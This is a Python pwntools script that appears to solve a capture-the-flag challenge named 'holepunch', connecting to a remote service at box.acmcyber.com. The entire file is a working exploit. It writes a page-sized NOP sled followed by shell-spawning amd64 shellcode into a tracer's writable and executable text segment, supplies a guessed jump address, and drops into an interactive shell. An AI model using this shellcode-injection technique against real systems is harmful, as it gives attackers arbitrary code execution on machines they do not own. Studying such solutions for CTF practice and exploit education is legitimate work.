#!/usr/bin/env python3

from pwn import *

exe = ELF("./holepunch")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("box.acmcyber.com", 31143)

    return r


def main():
    r = conn()

    # The text seg of the tracer is has rwx permissions, so we can overwrite an entire page of it
    # However, it is difficult (at least I can't) to figure out the address on the tracer that the
    # tracee it jumps back to after execution, so we jus use a nop sled. 
    payload = asm(shellcraft.amd64.linux.sh())
    r.sendafter(b'cod: ', b'\x90' * (0x1000-len(payload)) + payload) # nop sled before shellcode

    r.sendlineafter(b'addr: ', str(0x13371000).encode()) # Trial-and-error: 0x13370000 didn't work, so we try 0x13371000

    r.interactive()


if __name__ == "__main__":
    main()
